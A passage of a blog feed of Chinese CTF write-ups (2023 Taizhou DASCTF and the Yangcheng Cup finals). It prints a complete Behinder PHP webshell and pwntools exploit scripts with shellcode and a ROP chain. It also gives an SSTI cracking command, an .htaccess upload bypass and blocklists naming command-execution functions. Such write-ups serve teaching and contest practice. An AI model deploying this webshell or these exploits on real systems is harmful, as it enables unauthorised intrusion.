class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&quot;144a6b2296333602&quot;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;<br><span class="hljs-title function_ invoke__">session_write_close</span>();<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>&#123;<br><span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br><span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;<br>     <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>&#125;<br>    <span class="hljs-variable">$arr</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);<br>    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>    @<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(),<span class="hljs-variable">$params</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>拿到key后解密冰蝎流量</p><p>其中一条流量中发现命令<code>cd /var/www/html/upload/../;tar -czvf - flag | openssl des3 -salt -k th1sisKey -out ./flag.tar.gz</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c2.png"></p><p>生成<code>openssl des3 -salt -k th1sisKey -in ./flag.tar.gz -d -out out.tar.gz</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c1.png"></p><p>解压得到<br><code>🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅✉🚰🚹🎤💧📂👑🚫ℹ🍴😎ℹ🚨📮🛩🥋🥋🔪☀🌉😡👑😂🌊⌨🚪🚹😎🎈💧🕹💧🏎☃ℹ☃🔪🍌✅😇🍍⌨🌿💧🌊🎅☂⏩🌊🍵📮☀💵⌨☂📮😇☂🐍😆☀🚪🚹🍵💧🌏🚫😆🐘🐅😀🚰🐍🙃💧🗒🗒 </code></p><p>使用<code>th1sisKey</code>密钥解emoji-aes得到flag</p><h2 id="李先生的计算机"><a href="#李先生的计算机" class="headerlink" title="李先生的计算机"></a>李先生的计算机</h2><p><code>2.ad1</code>文件，使用FTK Imager挂载</p><p>根据提示直接找邮件存储位置<code>MailMasterData</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c3.png"></p><p>拿到search.db文件，用db browser查看</p><p>得到转账金额<code>600</code>和附件密码<code>dbt_1126_tta</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c4.png"></p><p>jpg加密软件密码<code>123654</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c6.png"></p><p>附件可以在<code>MailMasterData</code>下或<code>download</code>目录下找到</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c5.png"></p><p>解压后得到<code>BorromeanIslands.jpg</code>，jphs解密后得到银行卡号<code>6222025567723373838</code></p><p><code>DASCTF&#123;600_6222025567723373838&#125;</code></p><h2 id="Black-Mamba"><a href="#Black-Mamba" class="headerlink" title="Black Mamba"></a>Black Mamba</h2><p>iend后有冗余数据，提取出来后异或24</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>d=f.read()<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;output.zip&quot;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    f.write(<span class="hljs-built_in">bytes</span>([i^<span class="hljs-number">24</span>]))<br>f.close()<br></code></pre></td></tr></table></figure><p>异或后是压缩包，hint是<code>说了很多次不要用这么常见的密码了</code></p><p>掏出祖传的字典爆破，得到<code>1qaz@WSX</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c7.png"></p><p>解压后是</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">EAOJYU?TRX&gt;&#123;XPFABY&#123;<span class="hljs-number">8</span>&#123;<span class="hljs-number">24</span>+<br>有人好像对我键盘做了点手脚，看起来像坏了一样。<br></code></pre></td></tr></table></figure><p>Dvorak解码得到<code>DASCTF&#123;KOBE_BRYANT_8_24&#125;</code></p><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="rrrrs"><a href="#rrrrs" class="headerlink" title="rrrrs"></a>rrrrs</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">a</span>):<br>    a^=a&gt;&gt;<span class="hljs-number">18</span><br>    a^=(a&lt;&lt;<span class="hljs-number">15</span>)&amp;<span class="hljs-number">0xefc60000</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        a^=((a&amp;(<span class="hljs-number">127</span>&lt;&lt;(<span class="hljs-number">7</span>*i)))&lt;&lt;<span class="hljs-number">7</span>)&amp;(<span class="hljs-number">0x9d2c5680</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        a^=(a&amp;(<span class="hljs-number">4292870144</span>&gt;&gt;(<span class="hljs-number">11</span>*i)))&gt;&gt;<span class="hljs-number">11</span><br>    <span class="hljs-keyword">return</span> a.to_bytes(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;big&#x27;</span>)<br><br>c=[<br><span class="hljs-number">0xa7a1e601</span>,<br><span class="hljs-number">0x10a6a5df</span>,<br><span class="hljs-number">0xa3f03b11</span>,<br><span class="hljs-number">0x7e523d64</span>,<br><span class="hljs-number">0xcb99d7a8</span>,<br><span class="hljs-number">0x2ddc2485</span>,<br><span class="hljs-number">0xe3c8b3cd</span>,<br><span class="hljs-number">0x6b82a51e</span>,<br><span class="hljs-number">0x0ea07814</span>,<br><span class="hljs-number">0x6bf2bf07</span>]<br>flag=<span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:<br>    flag+=decode(i)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="babyshell"><a href="#babyshell" class="headerlink" title="babyshell"></a>babyshell</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>p=remote(<span class="hljs-string">&quot;tcp.cloud.dasctf.com&quot;</span>,<span class="hljs-string">&quot;21844&quot;</span>)<br><span class="hljs-comment">#p=process(&#x27;babyshell&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p,&quot;bp $rebase(0x1366)&quot;)</span><br><span class="hljs-comment">#pause()</span><br>shellcode=shellcraft.openat(-<span class="hljs-number">100</span>,<span class="hljs-string">&quot;flag&quot;</span>)<br>shellcode+=shellcraft.brk()<br>shellcode+=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rsi,rax</span><br><span class="hljs-string">sub rsi,0x1000</span><br><span class="hljs-string">mov rdi,3</span><br><span class="hljs-string">mov rdx,0x100</span><br><span class="hljs-string">mov rax,0</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>p.send(asm(shellcode))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="mercedes"><a href="#mercedes" class="headerlink" title="mercedes"></a>mercedes</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="hljs-string">&#x27;28629&#x27;</span>)<br>e=ELF(<span class="hljs-string">&quot;mercedes&quot;</span>)<br>context.binary=e<br>system=e.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>comm=<span class="hljs-number">0x601090</span><br>rdi=<span class="hljs-number">0x0000000000400983</span><br>ret=<span class="hljs-number">0x00000000004005ae</span><br>p.sendafter(<span class="hljs-string">&#x27;drink&#x27;</span>,<span class="hljs-string">&#x27;tac flag 1&gt;&amp;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;you?&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(rdi)+p64(comm)+p64(ret)+p64(system))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;briefphp&quot;&gt;&lt;a href=&quot;#briefphp&quot; class=&quot;headerlink&quot; title=&quot;brief</summary>
      
    
    
    
    <category term="wp" scheme="https://www.dr0n.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.dr0n.top/tags/wp/"/>
    
    <category term="台州" scheme="https://www.dr0n.top/tags/%E5%8F%B0%E5%B7%9E/"/>
    
    <category term="2023" scheme="https://www.dr0n.top/tags/2023/"/>
    
  </entry>
  
  <entry>
    <title>2023羊城杯决赛web&amp;pwn Break&amp;Fix wp</title>
    <link href="https://www.dr0n.top/posts/cec9c888/"/>
    <id>https://www.dr0n.top/posts/cec9c888/</id>
    <published>2023-09-09T06:00:00.000Z</published>
    <updated>2024-02-29T08:47:27.926Z</updated>
    
    <content type="html"><![CDATA[<p>Break和Fix阶段都是小组第一</p><p>比赛的时候没写wp，<strong>赛后复现</strong></p><h1 id="web-ezSSTI"><a href="#web-ezSSTI" class="headerlink" title="web-ezSSTI"></a>web-ezSSTI</h1><h2 id="Break"><a href="#Break" class="headerlink" title="Break"></a>Break</h2><p><a href="https://github.com/Marven11/Fenjing">焚靖</a>一把梭<br><code>python -m fenjing crack --url &quot;http://192.168.100.100:10007/&quot; --method GET --inputs name  --environment jinja</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-ezSSTI-1.png"></p><h2 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h2><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Template<br><span class="hljs-keyword">import</span> re<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-string">&#x27;CTFer&lt;!--?name=CTFer&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> re.findall(<span class="hljs-string">r&quot;&#x27;|_|\\x|\\u|&#123;&#123;|\+|attr|\.| |class|init|globals|popen|system|env|exec|shell_exec|flag|passthru|proc_popen&quot;</span>,name):<br>        t = Template(<span class="hljs-string">&quot;hello &quot;</span>+name)<br>        <span class="hljs-keyword">return</span> t.render()<br>    <span class="hljs-keyword">else</span>:<br>        t = Template(<span class="hljs-string">&quot;Hacker!!!&quot;</span>)<br>        <span class="hljs-keyword">return</span> t.render()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>,port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>直接在正则中添加<code>&quot;</code>，<code>()</code>，<code>[]</code>，<code>\</code>等符号，注意不要过滤太严格，否则过不了check</p><h1 id="web-easyupload"><a href="#web-easyupload" class="headerlink" title="web-easyupload"></a>web-easyupload</h1><h2 id="Break-1"><a href="#Break-1" class="headerlink" title="Break"></a>Break</h2><p>F12可以看到账号密码，<code>admin/hgrehhterh</code>，跳转到<code>dadaadwdwfegrgewg.php</code>，一个文件上传点</p><p>上传<code>.htaccess</code>后传图片拿shell</p><p><code>AddType application/x-httpd-php .png</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-easyupload-1.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-easyupload-2.png"></p><h2 id="Fix-1"><a href="#Fix-1" class="headerlink" title="Fix"></a>Fix</h2><p>dadaadwdwfegrgewg.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">1</span>);<br><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;WWW_ROOT&quot;</span>,<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>]);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;APP_ROOT&quot;</span>,<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>)));<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;APP_URL_ROOT&quot;</span>,<span class="hljs-title function_ invoke__">str_replace</span>(WWW_ROOT,<span class="hljs-string">&quot;&quot;</span>,APP_ROOT));<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;UPLOAD_PATH&quot;</span>, <span class="hljs-string">&quot;upload&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><br><br><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.php1&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.pHp1&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//收尾去空</span><br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传!&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>&lt;div id=<span class="hljs-string">&quot;upload_panel&quot;</span>&gt;<br>            &lt;form enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> onsubmit=<span class="hljs-string">&quot;return checkFile()&quot;</span>&gt;<br>                &lt;p&gt;请选择要上传的图片：&lt;p&gt;<br>                &lt;input <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">input_file</span>&quot; <span class="hljs-title">type</span>=&quot;<span class="hljs-title">file</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">upload_file</span>&quot;/&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">input</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">button</span>&quot; <span class="hljs-title">type</span>=&quot;<span class="hljs-title">submit</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">submit</span>&quot; <span class="hljs-title">value</span>=&quot;上传&quot;/&gt;</span><br><span class="hljs-class">            &lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">msg</span>&quot;&gt;</span><br><span class="hljs-class">                &lt;?<span class="hljs-title">php</span> </span><br><span class="hljs-class">                    <span class="hljs-title">if</span>($<span class="hljs-title">msg</span> != <span class="hljs-title">null</span>)</span>&#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;提示：&quot;</span>.<span class="hljs-variable">$msg</span>;<br>                    &#125;<br>                <span class="hljs-meta">?&gt;</span><br>            &lt;/div&gt;<br>            &lt;div id=<span class="hljs-string">&quot;img&quot;</span>&gt;<br>                <span class="hljs-meta">&lt;?php</span><br>                    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$is_upload</span>)&#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;&#x27;</span>.<span class="hljs-variable">$img_path</span>.<span class="hljs-string">&#x27;&quot; width=&quot;250px&quot; /&gt;&#x27;</span>;<br>                    &#125;<br>                <span class="hljs-meta">?&gt;</span><br>            &lt;/div&gt;<br>&lt;/div&gt;<br></code></pre></td></tr></table></figure><p>黑名单中加个<code>.htaccess</code>可以直接过check</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.php1&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.pHp1&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span 